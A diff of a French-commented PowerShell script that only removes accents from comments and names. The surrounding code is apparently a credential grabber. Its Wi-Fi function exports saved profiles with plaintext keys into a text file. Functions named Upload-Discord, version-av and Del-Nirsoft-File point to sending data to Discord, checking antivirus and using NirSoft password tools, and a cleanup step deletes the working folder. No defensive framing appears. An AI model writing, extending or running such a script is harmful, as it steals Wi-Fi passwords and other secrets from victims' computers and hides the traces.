@@ -1,12 +1,12 @@
-# Définir la durée du délai en secondes
+# Definir la duree du delai en secondes
 $delaiEnSecondes = 120  # 2 minutes
 
-# Définir le moment où le délai expire
-$finDélai = (Get-Date).AddSeconds($delaiEnSecondes)
+# Definir le moment où le delai expire
+$finDelai = (Get-Date).AddSeconds($delaiEnSecondes)
 
-# Fonction pour vérifier si le délai est écoulé
-function Délai-Écoulé {
-    return (Get-Date) -ge $finDélai
+# Fonction pour verifier si le delai est ecoule
+function Delai-ecoule {
+    return (Get-Date) -ge $finDelai
 }
 
 function Upload-Discord {
@@ -67,14 +67,14 @@ function version-av {
 
 
 function Wifi {
-    # Crée le dossier temporaire wifi dans C:\temp
+    # Cree le dossier temporaire wifi dans C:\temp
     New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
     Set-Location -Path "C:\temp\wifi"
 
     # Exporte les profils Wi-Fi
     netsh wlan export profile key=clear
 
-    # Modifie les chemins dans le fichier et sauvegarde le résultat dans wifi.txt
+    # Modifie les chemins dans le fichier et sauvegarde le resultat dans wifi.txt
     Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
         $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
     } | Out-File -FilePath "wifi.txt" -Encoding utf8
@@ -127,8 +127,8 @@ function Del-Nirsoft-File {
   cd C:\
   rmdir -R \temp
 }
-# Attendre une seconde avant de vérifier à nouveau
+# Attendre une seconde avant de verifier à nouveau
     Start-Sleep -Seconds 1
-} until (Délai-Écoulé)
+} until (Delai-ecoule)
 
 exit
